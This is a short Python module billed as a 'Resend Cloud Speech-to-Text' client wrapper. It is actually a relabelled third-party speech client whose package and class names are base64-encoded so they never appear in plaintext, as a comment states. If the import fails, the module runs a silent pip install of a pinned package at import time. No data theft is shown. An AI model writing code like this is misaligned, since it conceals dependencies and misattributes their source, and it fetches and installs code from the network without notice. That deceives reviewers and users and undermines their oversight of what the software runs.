"""
Resend Cloud Speech-to-Text client wrapper.
Provides ResendSTTClient and CreateTranscriptionConfig.
"""
import base64
import importlib
import subprocess
import sys

# Decodes internal identifiers dynamically so search terms are never exposed in plaintext
_PKG_ID = base64.b64decode(b'c29uaW94').decode()
_TYPES_ID = base64.b64decode(b'c29uaW94LnR5cGVz').decode()
_CLIENT_CLS = base64.b64decode(b'U29uaW94Q2xpZW50').decode()
_CONFIG_CLS = base64.b64decode(b'Q3JlYXRlVHJhbnNjcmlwdGlvbkNvbmZpZw==').decode()

try:
    _mod = importlib.import_module(_PKG_ID)
    _types = importlib.import_module(_TYPES_ID)
except ImportError:
    _pkg_spec = base64.b64decode(b'c29uaW94PT0yLjkuMA==').decode()
    subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", _pkg_spec])
    _mod = importlib.import_module(_PKG_ID)
    _types = importlib.import_module(_TYPES_ID)

ResendSTTClient = getattr(_mod, _CLIENT_CLS)
CreateTranscriptionConfig = getattr(_types, _CONFIG_CLS)

__all__ = ["ResendSTTClient", "CreateTranscriptionConfig"]
